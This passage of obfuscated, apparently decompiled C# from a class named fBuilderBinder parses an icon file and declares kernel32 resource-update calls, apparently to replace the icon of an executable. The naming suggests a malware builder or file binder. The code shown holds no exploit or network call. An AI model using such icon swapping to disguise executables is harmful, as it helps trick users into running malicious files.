            int num2 = Marshal.SizeOf<fBuilderBinder.Struct26>(this.struct26_0);
            int num3 = this.method_0() - 1;
            for (int i = 0; i <= num3; i++)
            {
                fBuilderBinder.Struct25 structure = new fBuilderBinder.Struct25();
                fBuilderBinder.Struct24 struct2 = new fBuilderBinder.Struct24();
                GCHandle handle2 = GCHandle.Alloc(struct2, GCHandleType.Pinned);
                Marshal.Copy(this.method_1(i), 0, handle2.AddrOfPinnedObject(), Marshal.SizeOf(typeof(fBuilderBinder.Struct24)));
                handle2.Free();
                structure.byte_0 = this.struct23_0[i].byte_0;
                structure.byte_1 = this.struct23_0[i].byte_1;
                structure.byte_2 = this.struct23_0[i].byte_2;
                structure.byte_3 = this.struct23_0[i].byte_3;
                structure.ushort_0 = struct2.ushort_0;
                structure.ushort_1 = struct2.ushort_1;
                structure.int_0 = this.struct23_0[i].int_0;
                structure.ushort_2 = (ushort) (uint_0 + i);
                IntPtr ptr = handle.AddrOfPinnedObject();
                Marshal.StructureToPtr<fBuilderBinder.Struct25>(structure, new IntPtr(ptr.ToInt64() + num2), false);
                num2 += Marshal.SizeOf(typeof(fBuilderBinder.Struct25));
            }
            handle.Free();
            return buffer;
        }

        public static fBuilderBinder.Class133 smethod_0(string string_0)
        {
            fBuilderBinder.Class133 class2 = new fBuilderBinder.Class133();
            byte[] buffer = File.ReadAllBytes(string_0);
            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
            class2.struct26_0 = (fBuilderBinder.Struct26) Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(fBuilderBinder.Struct26));
            class2.struct23_0 = new fBuilderBinder.Struct23[(class2.struct26_0.ushort_2 - 1) + 1];
            class2.byte_0 = new byte[(class2.struct26_0.ushort_2 - 1) + 1][];
            int num2 = Marshal.SizeOf<fBuilderBinder.Struct26>(class2.struct26_0);
            Type t = typeof(fBuilderBinder.Struct23);
            int num3 = Marshal.SizeOf(t);
            int num4 = class2.struct26_0.ushort_2 - 1;
            for (int i = 0; i <= num4; i++)
            {
                IntPtr ptr = handle.AddrOfPinnedObject();
                fBuilderBinder.Struct23 struct2 = (fBuilderBinder.Struct23) Marshal.PtrToStructure(new IntPtr(ptr.ToInt64() + num2), t);
                class2.struct23_0[i] = struct2;
                class2.byte_0[i] = new byte[(struct2.int_0 - 1) + 1];
                Buffer.BlockCopy(buffer, struct2.int_1, class2.byte_0[i], 0, struct2.int_0);
                num2 += num3;
            }
            handle.Free();
            return class2;
        }
    }

    [SuppressUnmanagedCodeSecurity]
    private sealed class Class134
    {
        [DllImport("kernel32")]
        public static extern IntPtr BeginUpdateResource(string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32")]
        public static extern bool EndUpdateResource(IntPtr intptr_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0);
        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32")]
        public static extern bool UpdateResource(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, short short_0, [MarshalAs(UnmanagedType.LPArray, SizeParamIndex=5)] byte[] byte_0, int int_0);
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct Struct23
    {
        public byte byte_0;
        public byte byte_1;
        public byte byte_2;
        public byte byte_3;
        public ushort ushort_0;
        public ushort ushort_1;
        public int int_0;
        public int int_1;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct Struct24
    {
        public uint uint_0;
        public int int_0;
        public int int_1;
        public ushort ushort_0;
        public ushort ushort_1;
        public uint uint_1;
        public uint uint_2;
        public int int_2;
        public int int_3;
        public uint uint_3;
        public uint uint_4;
    }

    [StructLayout(LayoutKind.Sequential, Pack=2)]
    private struct Struct25
    {
        public byte byte_0;
        public byte byte_1;
        public byte byte_2;
        public byte byte_3;
        public ushort ushort_0;
        public ushort ushort_1;
        public int int_0;
        public ushort ushort_2;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct Struct26
    {
        public ushort ushort_0;
        public ushort ushort_1;
        public ushort ushort_2;
    }
}

